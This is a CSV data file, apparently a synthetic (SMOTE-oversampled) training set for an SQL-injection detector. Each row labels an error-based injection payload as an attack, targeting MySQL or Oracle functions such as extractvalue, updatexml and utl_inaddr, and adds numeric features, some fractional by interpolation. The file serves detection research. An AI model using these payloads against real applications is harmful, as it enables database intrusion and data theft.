id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000205,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.3541770751176444,216.9038101535067,40.38085952717139,4.218726853752541,119.95166133557825,2.0,71.57128929075708,23.38085952717139,0.5524741798180822,0.009245358391427067,0.330459393331712,0.10782106845877881,3.0,0.0,0.0,0.0,0.0,3.095214881792846,0.0,10.0,0.0,4.2856446453785395,1.0,3.095214881792847,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0952148817928464,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.095214881792846
SMOTE_000206,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.8842392251139449,333.8992258098708,32.34531378361287,3.453509859280606,81.5179706754193,49.0,146.34531378361288,57.03594135083861,0.2441351028631114,0.14677313863602806,0.43833079145665754,0.17076096704420293,0.6906275672257416,0.0,0.0,0.0,0.0,2.1726568918064353,0.0,30.827343108193567,0.3453137836128707,0.0,1.0,22.172656891806433,0.17265689180643545,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1726568918064355,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.172656891806435
SMOTE_000207,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,0.8871231490338595,216.05126388054012,30.13399327876195,3.4031121000182654,51.97931765044454,32.86600672123805,100.64928404425429,30.556655464603246,0.24065471298512842,0.15324653076978872,0.4647560979321746,0.1413426583129083,4.0,0.0,0.0,0.0,0.7113310929206492,2.0,0.0,18.845324371682597,0.0,0.0,4.288668907079351,2.7113310929206493,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.422662185841298,0.0,0.0,0.7113310929206491,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.133993278761947
SMOTE_000208,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,0.5857633189440802,211.5318386922316,32.851061289741054,3.5528452049252235,57.10636773844632,32.44681613077684,93.72334837430317,28.255306448705266,0.27016449590190594,0.15410925542852413,0.44224549222677767,0.13348075644279225,0.0,4.0,0.0,0.0,0.8510612897410536,0.9999999999999999,0.0,17.404245158964216,0.0,0.0,4.148938710258947,1.8510612897410539,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.702122579482107,0.0,0.0,0.8510612897410534,1.1489387102589466,0.8510612897410534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.55318386922316
SMOTE_000209,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,1.1078823991051832,341.0041017518621,38.55509980534866,3.8743512586953193,109.55509980534866,55.0,136.55920155721074,39.889800389302685,0.32134626714548353,0.16131605292917434,0.4003782558771064,0.11695942404823574,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.889800389302685,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.5550998053486582,0.44490019465134195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000210,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.0488536295007782,333.0175150369277,34.0,3.4835617063731004,80.0,52.0,144.0175150369277,57.0,0.2402362699828271,0.1561535754888376,0.432441812165571,0.17116834236276432,0.4956212407680731,0.0,1.0,0.0,0.0,2.0,0.0,30.504378759231926,0.0,0.0,1.0,23.0,0.4956212407680731,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000211,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,2.3734721702013135,339.3452259180431,33.528768826503594,3.5590976433906603,87.87399474454675,51.11507530601438,142.82738704097844,57.528768826503594,0.25869414588999934,0.15057147588387235,0.4211787169831703,0.16955566124295807,1.0,0.0,1.0575376530071916,0.0,0.0,2.5287688265035957,0.0,29.41369352048921,0.0,1.586306479510787,0.47123117349640387,23.586306479510785,1.0,0.0,0.5287688265035958,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5287688265035957,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.528768826503596
SMOTE_000212,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000029,1.3437259727657167,190.70183280554568,30.940366561109137,3.696209852028101,50.4105498416637,39.23509164027728,75.8210996833274,25.235091640277282,0.2642753017819634,0.20603287309936563,0.39720980129173356,0.13248202382693738,3.2947250791681473,0.0,0.4701832805545683,0.0,0.23509164027728402,1.235091640277284,0.0,14.235091640277282,0.0,0.0,5.5298167194454315,1.940366561109137,1.0,0.0,0.23509164027728424,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4701832805545685,0.0,0.23509164027728413,0.23509164027728402,1.7649083597227158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.705274920831853
SMOTE_000213,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,1.4885980173586961,218.0,38.45614066432909,3.7519848574997785,63.0,37.0,93.0,25.0,0.2889908256880734,0.16972477064220184,0.42660550458715596,0.11467889908256881,0.5438593356709116,0.45614066432908845,1.0,0.0,1.0,0.9999999999999999,0.0,17.0,0.0,0.0,3.0,3.0,0.5438593356709116,0.4561406643290884,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000214,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000048,0.08879941764548037,209.99946195550683,31.0,3.945712533410506,77.0,37.0,72.79956956440546,23.199892391101365,0.36673966986576595,0.17622555564978365,0.3465764081659621,0.11045836631848831,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.199892391101365,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000215,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.9710210664722839,322.3747079106503,37.59284045203716,3.9667190414690823,109.29642022601858,55.0,121.2997663285202,36.77852135611147,0.33976797410272036,0.171011518740433,0.37526957345557915,0.11395093370126747,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.778521356111472,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2964202260185786,0.7035797739814214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000216,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.06992591871867254,218.21296448426946,31.0,3.8621980833803216,77.0,37.0,79.37037158741558,24.842592896853894,0.35292219385006335,0.16958598925262786,0.36365983305810345,0.1138319838392053,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.842592896853894,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000217,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,1.7029759849645585,221.3798187449047,32.658914020132556,3.9235470317900156,73.4961084429163,44.31782804026512,77.88371030198839,25.68217195973488,0.3302382762225071,0.20116447390128264,0.35145262820161816,0.11714462167459207,2.682171959734882,0.0,0.0,0.0,0.0,2.0,0.0,13.317828040265118,0.0,0.0,5.0,4.682171959734882,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.34108597986744094,2.0,0.0,1.0,0.34108597986744094,-1.1102230246251565e-16,0.34108597986744094,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6589140201325591,0.6589140201325591,6.0
SMOTE_000218,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000048,0.39686105512240344,213.46678071471806,31.0,3.910457023566706,77.0,37.0,75.57342457177444,23.89335614294361,0.36090664143162066,0.1734226718567528,0.35378815241181444,0.1118825342998121,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.89335614294361,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000219,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,0.12411559861365956,218.0,38.038031873578404,3.7430568500101464,63.0,37.0,93.0,25.0,0.2889908256880734,0.16972477064220184,0.42660550458715596,0.11467889908256881,0.9619681264215935,0.03803187357840654,1.0,0.0,1.0,0.9999999999999999,0.0,17.0,0.0,0.0,3.0,3.0,0.9619681264215934,0.03803187357840654,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000220,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,1.6712232388561208,209.8243509523538,29.988290063490254,3.455460103630137,52.48243509523538,33.51756490476462,94.85948076188305,28.964870190470762,0.25089533777779727,0.16107288599650638,0.4503060426101841,0.13772573361551224,4.0,0.0,0.0,0.0,0.49414503174512675,1.4941450317451266,0.0,17.976580126980508,0.0,0.0,4.505854968254873,1.9882900634902532,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9882900634902532,0.0,0.0,0.49414503174512675,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.48243509523538
SMOTE_000221,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000068,0.6040533345925116,343.81683415386544,38.242573982903835,3.8590634921787705,109.24257398290383,55.0,139.05940813676932,40.51485203419233,0.31778953770358476,0.1599893151192724,0.40439599320446606,0.1178251539726768,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.514852034192327,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2425739829038365,0.7574260170961635,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000222,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,0.3113133848622745,196.8744817196902,31.811722579535317,3.9078890959041415,58.49792687876085,42.49792687876084,68.94138710232342,26.937240859845105,0.29711043013547217,0.21583987716176511,0.3502274763040161,0.1368222163987466,4.0,0.0,0.0,0.0,0.0,1.9372408598451052,0.0,12.251036560619578,0.0,0.0,5.0,5.686204299225526,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9372408598451054,1.9372408598451054,0.0,0.9372408598451052,0.9372408598451053,0.06275914015489459,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.874481719690211
SMOTE_000223,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",nearest_attack_euclidean,R000035,1.407057401220099,320.9859217406529,39.45198577102779,4.041367089835666,112.90397154205559,55.0,117.35595731308338,35.7259928855139,0.35173837121042467,0.17138774804031173,0.3655682313957059,0.11130564935355775,1.0960284579444122,2.903971542055588,0.0,0.0,2.0,1.274007114486103,0.0,21.451985771027793,0.0,0.0,6.0,4.274007114486103,0.274007114486103,0.7259928855138968,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000224,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.08299285914454008,325.284291291108,31.04061304158686,3.532481642935168,88.67509566730513,45.162452166347435,136.4061304158686,55.04061304158686,0.2726330321312841,0.13883228772903666,0.41932649462063576,0.16920818551904346,0.0,0.0,0.0,0.0,0.0,2.0,0.0,29.081226083173718,0.0,2.8781608752394225,0.040613041586858856,22.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000225,attack,error,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000010,1.052808121129243,336.2112261047801,38.42097487724666,3.8228104336579096,101.42097487724665,55.0,137.63220098202677,42.15805024550669,0.3017309189770843,0.163616336984513,0.4092781717888316,0.12537457224957108,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.158050245506693,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.4209748772466544,0.5790251227533457,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000226,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.6508465926590417,234.42965931977542,30.84964314596097,3.6985189687075737,72.79000808690724,37.30071370807806,95.94036494094625,28.39857258384389,0.3088386255474965,0.1608959696497915,0.40865840852852775,0.1216069962741842,4.0,0.0,0.0,0.0,0.0,1.8496431459609726,0.0,17.39857258384389,0.0,0.0,5.150356854039027,1.8496431459609726,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1503568540390274,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8496431459609726,0.8496431459609726,4.849643145960973
SMOTE_000227,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.6981010078099004,248.32962295462588,35.32962295462588,3.997790288636656,94.0,35.0,89.0,30.329622954625886,0.3785305001014569,0.14094220748458502,0.35839589903223046,0.1221313933817276,0.32962295462588487,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,18.0,0.0,2.0,6.0,3.0,0.329622954625885,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_000228,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,1.5967785753314951,325.92080084388135,34.0,3.564745040694518,86.37733286451035,48.0,136.0566678387241,55.48680014064689,0.2653536587978835,0.14733393460767996,0.4170647067949443,0.17024769979949222,0.0,0.0,1.0,0.0,0.0,2.0,0.0,28.64906685419586,0.0,2.513199859353106,0.0,23.0,0.0,0.0,0.0,0.1622667135489647,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8377332864510355,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.16226671354896466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000229,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,2.018318651131439,302.1874418487208,38.636032832428185,4.002473166053063,104.9117373405745,55.0,109.81983583785907,32.45586867028725,0.34708526017011193,0.18213766836111253,0.3634663207877605,0.10731075068101503,1.4558686702872532,0.0,0.0,0.0,2.0,1.3639671675718135,0.0,20.0,0.0,0.0,6.0,4.363967167571813,0.3639671675718133,0.0,0.0,0.6360328324281868,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.7279343351436267,0.6360328324281868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.363967167571813
